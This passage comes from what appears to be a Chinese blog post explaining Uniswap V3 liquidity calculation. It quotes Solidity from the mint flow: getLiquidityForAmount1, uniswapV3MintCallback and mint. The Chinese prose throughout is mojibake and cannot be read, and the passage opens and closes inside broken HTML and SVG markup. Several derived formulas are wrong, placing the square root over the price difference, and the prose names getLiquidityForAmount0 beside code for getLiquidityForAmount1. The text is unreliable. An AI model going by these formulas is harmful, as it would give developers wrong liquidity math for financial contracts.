480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"/></g></g><g data-mml-node="mo" transform="translate(0,91.4)"><path data-c="221A" d="M95 178Q89 178 81 186T72 200T103 230T169 280T207 309Q209 311 212 311H213Q219 311 227 294T281 177Q300 134 312 108L397 -77Q398 -77 501 136T707 565T814 786Q820 800 834 800Q841 800 846 794T853 782V776L620 293L385 -193Q381 -200 366 -200Q357 -200 354 -197Q352 -195 256 15L160 225L144 214Q129 202 113 190T95 178Z"/></g><rect width="751" height="42.4" x="853" y="849"/></g><g data-mml-node="mi" transform="translate(1637,-150) scale(0.707)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"/></g></g><rect width="1609.4" height="60" x="120" y="220"/></g><g data-mml-node="mo" transform="translate(2071.6,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"/></g><g data-mml-node="mfrac" transform="translate(3071.8,0)"><g data-mml-node="mn" transform="translate(746.9,394) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g><g data-mml-node="msub" transform="translate(220,-525.2) scale(0.707)"><g data-mml-node="msqrt"><g transform="translate(853,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"/></g></g><g data-mml-node="mo" transform="translate(0,91.4)"><path data-c="221A" d="M95 178Q89 178 81 186T72 200T103 230T169 280T207 309Q209 311 212 311H213Q219 311 227 294T281 177Q300 134 312 108L397 -77Q398 -77 501 136T707 565T814 786Q820 800 834 800Q841 800 846 794T853 782V776L620 293L385 -193Q381 -200 366 -200Q357 -200 354 -197Q352 -195 256 15L160 225L144 214Q129 202 113 190T95 178Z"/></g><rect width="751" height="42.4" x="853" y="849"/></g><g data-mml-node="mi" transform="translate(1637,-150) scale(0.707)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"/></g></g><rect width="1607.4" height="60" x="120" y="220"/></g></g><rect width="5119.2" height="60" x="120" y="220"/></g><g data-mml-node="mo" transform="translate(7651.6,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="mfrac" transform="translate(8707.3,0)"><g data-mml-node="mrow" transform="translate(2196.8,676)"><g data-mml-node="mi"><path data-c="394" d="M51 0Q46 4 46 7Q46 9 215 357T388 709Q391 716 416 716Q439 716 444 709Q447 705 616 357T786 7Q786 4 781 0H51ZM507 344L384 596L137 92L383 91H630Q630 93 507 344Z"/></g><g data-mml-node="mi" transform="translate(833,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g></g><g data-mml-node="mrow" transform="translate(220,-929)"><g data-mml-node="msub"><g data-mml-node="msqrt"><g transform="translate(853,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"/></g></g><g data-mml-node="mo" transform="translate(0,109)"><path data-c="221A" d="M95 178Q89 178 81 186T72 200T103 230T169 280T207 309Q209 311 212 311H213Q219 311 227 294T281 177Q300 134 312 108L397 -77Q398 -77 501 136T707 565T814 786Q820 800 834 800Q841 800 846 794T853 782V776L620 293L385 -193Q381 -200 366 -200Q357 -200 354 -197Q352 -195 256 15L160 225L144 214Q129 202 113 190T95 178Z"/></g><rect width="751" height="60" x="853" y="849"/></g><g data-mml-node="mi" transform="translate(1637,-150) scale(0.707)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"/></g></g><g data-mml-node="mo" transform="translate(2215.4,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"/></g><g data-mml-node="msub" transform="translate(3215.6,0)"><g data-mml-node="msqrt"><g transform="translate(853,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"/></g></g><g data-mml-node="mo" transform="translate(0,109)"><path data-c="221A" d="M95 178Q89 178 81 186T72 200T103 230T169 280T207 309Q209 311 212 311H213Q219 311 227 294T281 177Q300 134 312 108L397 -77Q398 -77 501 136T707 565T814 786Q820 800 834 800Q841 800 846 794T853 782V776L620 293L385 -193Q381 -200 366 -200Q357 -200 354 -197Q352 -195 256 15L160 225L144 214Q129 202 113 190T95 178Z"/></g><rect width="751" height="60" x="853" y="849"/></g><g data-mml-node="mi" transform="translate(1637,-150) scale(0.707)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"/></g></g></g><rect width="5476.7" height="60" x="120" y="220"/></g></g></g></svg></mjx-container></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint128 liquidity0 = getLiquidityForAmount0(sqrtRatioX96, sqrtRatioBX96, amount0);<br>uint128 liquidity1 = getLiquidityForAmount1(sqrtRatioAX96, sqrtRatioX96, amount1);<br><br>liquidity = liquidity0 &lt; liquidity1 ? liquidity0 : liquidity1;<br></code></pre></td></tr></table></figure><p>æ¯”è¾ƒä¸¤ç§ç®—æ³•çš„ç»“æœï¼Œå–æ›´å°çš„ä¸€ä¸ª</p><p>æƒ…å†µä¸‰ï¼šå½“å‰æ± ä¸­çš„ä»·æ ¼å¤§äºç­‰äºä»·æ ¼èŒƒå›´çš„æœ€å¤§å€¼</p><p><img src="/2022/08/20/uniswap-v3-2/image-20220819162404788.png" alt="image-20220819162404788"></p><p>æ­¤æ—¶æ·»åŠ çš„æµåŠ¨æ€§å…¨éƒ¨ä¸ºy token<br><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -2.459ex;" xmlns="http://www.w3.org/2000/svg" width="17.491ex" height="5.608ex" role="img" focusable="false" viewbox="0 -1392 7731.2 2478.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"/></g><g data-mml-node="mo" transform="translate(958.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="mfrac" transform="translate(2014.6,0)"><g data-mml-node="mrow" transform="translate(2196.8,676)"><g data-mml-node="mi"><path data-c="394" d="M51 0Q46 4 46 7Q46 9 215 357T388 709Q391 716 416 716Q439 716 444 709Q447 705 616 357T786 7Q786 4 781 0H51ZM507 344L384 596L137 92L383 91H630Q630 93 507 344Z"/></g><g data-mml-node="mi" transform="translate(833,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g></g><g data-mml-node="mrow" transform="translate(220,-929)"><g data-mml-node="msub"><g data-mml-node="msqrt"><g transform="translate(853,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"/></g></g><g data-mml-node="mo" transform="translate(0,109)"><path data-c="221A" d="M95 178Q89 178 81 186T72 200T103 230T169 280T207 309Q209 311 212 311H213Q219 311 227 294T281 177Q300 134 312 108L397 -77Q398 -77 501 136T707 565T814 786Q820 800 834 800Q841 800 846 794T853 782V776L620 293L385 -193Q381 -200 366 -200Q357 -200 354 -197Q352 -195 256 15L160 225L144 214Q129 202 113 190T95 178Z"/></g><rect width="751" height="60" x="853" y="849"/></g><g data-mml-node="mi" transform="translate(1637,-150) scale(0.707)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"/></g></g><g data-mml-node="mo" transform="translate(2215.4,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"/></g><g data-mml-node="msub" transform="translate(3215.6,0)"><g data-mml-node="msqrt"><g transform="translate(853,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"/></g></g><g data-mml-node="mo" transform="translate(0,109)"><path data-c="221A" d="M95 178Q89 178 81 186T72 200T103 230T169 280T207 309Q209 311 212 311H213Q219 311 227 294T281 177Q300 134 312 108L397 -77Q398 -77 501 136T707 565T814 786Q820 800 834 800Q841 800 846 794T853 782V776L620 293L385 -193Q381 -200 366 -200Q357 -200 354 -197Q352 -195 256 15L160 225L144 214Q129 202 113 190T95 178Z"/></g><rect width="751" height="60" x="853" y="849"/></g><g data-mml-node="mi" transform="translate(1637,-150) scale(0.707)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"/></g></g></g><rect width="5476.7" height="60" x="120" y="220"/></g></g></g></svg></mjx-container><br>ä»¥ä¸Šè¿‡ç¨‹è¡¨ç¤ºåœ¨getLiquidityForAmount0ä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function getLiquidityForAmount1(<br>    uint160 sqrtRatioAX96,<br>    uint160 sqrtRatioBX96,<br>    uint256 amount1<br>) internal pure returns (uint128 liquidity) {<br>//æ’åº<br>    if (sqrtRatioAX96 &gt; sqrtRatioBX96) (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96);<br>    return toUint128(FullMath.mulDiv(amount1, FixedPoint96.Q96, sqrtRatioBX96 - sqrtRatioAX96));<br>}<br></code></pre></td></tr></table></figure><h3 id="MintCallbackData"><a href="#MintCallbackData" class="headerlink" title="MintCallbackData"></a>MintCallbackData</h3><p>è¿™é‡Œæ˜¯ä¸ºäº†å°†Positionçš„ownerå’Œå®é™…æµåŠ¨æ€§tokençš„æ”¯ä»˜è€…è§£è€¦ï¼Œè®©åˆçº¦æ¥ç®¡ç†ç”¨æˆ·çš„æµåŠ¨æ€§ï¼Œå¹¶å°†æµåŠ¨æ€§tokenåŒ–ï¼ˆERC721ï¼‰</p><p>ç”¨æˆ·è°ƒç”¨NonfungiblePositionManageræ¥æä¾›æµåŠ¨æ€§ï¼Œæ‰€ä»¥Positionçš„owneræ˜¯NonfungiblePositionManagerï¼ŒNonfungiblePositionManageræ˜¯é€šè¿‡NFT tokenå°†Positionå’Œç”¨æˆ·å…³è”èµ·æ¥çš„</p><p>è¿™ä¸ªå‡½æ•°å¯ä»¥å°†æŒ‡å®šæ•°é‡çš„token0ä¸token1å‘é€åˆ°åˆçº¦ä¸­å»</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs solidity">struct MintCallbackData {<br>        PoolAddress.PoolKey poolKey;<br>        address payer; //æ”¯ä»˜tokençš„åœ°å€<br>    }<br><br>    /// @inheritdoc IUniswapV3MintCallback<br>    function uniswapV3MintCallback(<br>        uint256 amount0Owed,<br>        uint256 amount1Owed,<br>        bytes calldata data<br>    ) external override {<br>        MintCallbackData memory decoded = abi.decode(data, (MintCallbackData));<br>        CallbackValidation.verifyCallback(factory, decoded.poolKey);<br><br>//æ ¹æ®ä¼ å…¥çš„å‚æ•°ï¼Œä½¿ç”¨transferFromä»£ç”¨æˆ·å‘Poolä¸­æ”¯ä»˜token<br>        if (amount0Owed &gt; 0) pay(decoded.poolKey.token0, decoded.payer, msg.sender, amount0Owed);<br>        if (amount1Owed &gt; 0) pay(decoded.poolKey.token1, decoded.payer, msg.sender, amount1Owed);<br>    }<br><br></code></pre></td></tr></table></figure><h2 id="mint"><a href="#mint" class="headerlink" title="mint"></a>mint</h2><p>ä½äºUniswapV3Pool.sol</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/// @inheritdoc IUniswapV3PoolActions<br>/// @dev noDelegateCall is applied indirectly via _modifyPosition<br>function mint(<br>    address recipient, //åˆ›é€ æµåŠ¨æ€§çš„åœ°å€<br>    int24 tickLower, //æµåŠ¨æ€§å¤´å¯¸ä¸‹é™<br>    int24 tickUpper, //æµåŠ¨æ€§å¤´å¯¸ä¸Šé™<br>    uint128 amount, //å¢åŠ çš„æµåŠ¨æ€§æ•°é‡<br>    bytes calldata data //å›è°ƒå‡½æ•°çš„å‚æ•°<br>) external override lock returns (uint256 amount0, uint256 amount1) {<br>//æ£€æŸ¥å¢åŠ çš„æµåŠ¨æ€§çš„æ•°é‡å¤§äº0<br>    require(amount &gt; 0);<br>    //ä¿®æ”¹Positionï¼Œæ·»åŠ æµåŠ¨æ€§ï¼Œè¯¦è§ä¸‹é¢çš„_modifyPositionéƒ¨åˆ†<br>    //è¿”å›éœ€è¦æŠ•å…¥çš„token0å’Œtoken1çš„æ•°é‡<br>    (, int256 amount0Int, int256 amount1Int) =<br>        _modifyPosition(<br>            ModifyPositionParams({<br>                owner: recipient,<br>                tickLower: tickLower,<br>                tickUpper: tickUpper,<br>                liquidityDelta: int256(amount).toInt128()<br>            })<br>        );<br><br>    amount0 = uint256(amount0Int);<br>    amount1 = uint256(amount1Int);<br><br>    uint256 balance0Before;<br>    uint256 balance1Before;<br>    if (amount0 &gt; 0) balance0Before = balance0();<br>    if (amount1 &gt; 0) balance1Before = balance1();<br>    //å›è°ƒå‡½æ•°å°†æŒ‡å®šæ•°é‡çš„token0å’Œtoken1å‘é€åˆ°åˆçº¦ä¸­<br>    IUniswapV3MintCallback(msg.sender).uniswapV3MintCallback(amount0, amount1, data);<br>    //æ£€æŸ¥æŠ•å…¥çš„token0å’Œtoken1æ˜¯å¦ç¬¦åˆé¢„æœŸçš„æ•°é‡<br>    if (amount0 &gt; 0) require(balance0Before.add(amount0) &lt;= balance0(), 'M0');<br>    if (amount1 &gt; 0) require(balance1Before.add(amount1) &lt;= balance1(), 'M1');<br><br>    emit Mint(msg.sender, recipient, tickLower, tickUpper, amount, amount0, amount1);<br>}<br><br></code></pre></td></tr></table></figure><h2 id="modifyPosition"><a href="#modifyPosition" class="headerlink" title="_modifyPosition"></a>_modifyPosition</h2><p>ModifyPositionParamsç”¨äºå­˜å‚¨Position(æµåŠ¨æ€§)ç›¸å…³çš„æ•°æ®ä¿¡æ¯ï¼ŒåŒ…æ‹¬æµåŠ¨æ€§æ‰€æœ‰è€…åœ°å€ã€æµåŠ¨æ€§çš„ä¸Šä¸‹é™ã€æµåŠ¨æ€§çš„æ”¹åŠ¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">struct ModifyPositionParams {<br>    // the address that owns the position<br>    address owner;<br>    // the lower and upper tick of the position<br>    int24 tickLower;<br>    int24 tickUpper;<br>    // any change in liquidity<br>    int128 liquidityDelta;<br>}<br></code></pre></td></tr></table></figure><p>_modifyPositionç”¨äºæ›´æ–°å½“å‰Position</p><p>æ·»åŠ æµåŠ¨æ€§çš„è§„åˆ™</p><p>æˆ‘ä»¬çŸ¥é“V3çš„æ ¸å¿ƒå…¬å¼</p><blockquote><p>y = p*x</p><p>x*y = L^2</p></blockquote><p>å¯ä»¥å¾—åˆ°</p><blockquote><p>x = L / âˆšp </p><p>y = L * âˆšp</p></blockquote><p><strong>å½“ä»·æ ¼påœ¨åŒºé—´å†…æ—¶</strong></p><p><img src="/2022/08/20/uniswap-v3-2/image-20220819162436593.png" alt="image-20220819162436593"></p><p>æ©™è‰²åŒºåŸŸæ˜¯æˆ‘ä»¬å®é™…éœ€è¦æ·»åŠ çš„æµåŠ¨æ€§ï¼Œè™šæ‹ŸæµåŠ¨æ€§æ˜¯ç»¿è‰²åŒºåŸŸæ‰£é™¤æ©™è‰²çš„éƒ¨åˆ†çš„å®½åº¦å’Œé«˜åº¦ã€‚</p><p><code>delta x</code> å°±æ˜¯ <code>p</code>ï¼ˆçº¢ç‚¹ï¼‰ å’Œ <code>p_upper</code> åœ¨ x è½´ä¸Šçš„è·ç¦»ï¼Œ <code>delta y</code> å°±æ˜¯ <code>p</code> å’Œ <code>p_lower</code> åœ¨ y è½´ä¸Šçš„è·ç¦»ã€‚</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-built_in">delta</span> x = L / âˆšp - L / âˆšp_{<span class="hljs-built_in">upper</span>} = L * (âˆšp_{<span class="hljs-built_in">upper</span>} - âˆšp) / (âˆšp * âˆšp_{<span class="hljs-built_in">upper</span>}) <br><br><span class="hljs-built_in">delta</span> y = L * âˆšp  - L * âˆšp_{<span class="hljs-built_in">lower</span>} = L * (âˆšp - âˆšp_{<span class="hljs-built_in">lower</span>})<br></code></pre></td></tr></table></figure><p>å†å˜æ¢ä¸€ä¸‹ï¼Œæ”¹å†™æˆæ±‚ Lï¼ˆæµåŠ¨æ€§æ•°é‡ï¼‰çš„ç­‰å¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs math">L = delta x * (âˆšp * âˆšp_{upper}) / (âˆšp_{upper} - âˆšp) <br>L = delta y / âˆš(p - p_{lower})<br></code></pre></td></tr></table></figure><p><strong>å½“ä»·æ ¼på¤§äºåŒºé—´æ—¶</strong></p><p><img src="/2022/08/20/uniswap-v3-2/image-20220819162505525.png" alt="image-20220819162505525"></p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">L = <span class="hljs-built_in">delta</span> y / âˆš(p_{<span class="hljs-built_in">upper</span>} - p_{<span class="hljs-built_in">lower</span>})<br></code></pre></td></tr></table></figure><p><strong>å½“ä»·æ ¼på°äºåŒºé—´æ—¶</strong></p><p><img src="/2022/08/20/uniswap-v3-2/image-20220819162537608.png" alt="image-20220819162537608"></p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">L = <span class="hljs-built_in">delta</span> x * (âˆšp_{<span class="hljs-built_in">upper</span>} * âˆšp_{<span class="hljs-built_in">lower</span>}) / (âˆšp_{<span class="hljs-built_in">upper</span>} - âˆšp_{<span class="hljs-built_in">lower</span>})<br></code></pre></td></tr></table></figure><p>è½¬åŒ–ä¸ºä»£ç </p><p>æ³¨æ„ï¼šè¿™é‡Œçš„amount0ä¸amount1ä¸ºint256ç±»å‹ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™é‡Œçš„amount0ä¸amount1è¿™ä¸¤ä¸ªè¿”å›å€¼å¯æ­£å¯è´Ÿï¼Œå¦‚æœä¸ºæ­£åˆ™è¡¨ç¤ºæµåŠ¨æ€§æä¾›è‡³éœ€è¦ç»™æ± å­ç»™äºˆçš„æ•°é‡ï¼Œä¸ºè´Ÿæ•°åˆ™è¡¨ç¤ºæ± å­éœ€è¦ç»™æµåŠ¨æ€§æä¾›è€…ç»™äºˆçš„æ•°é‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 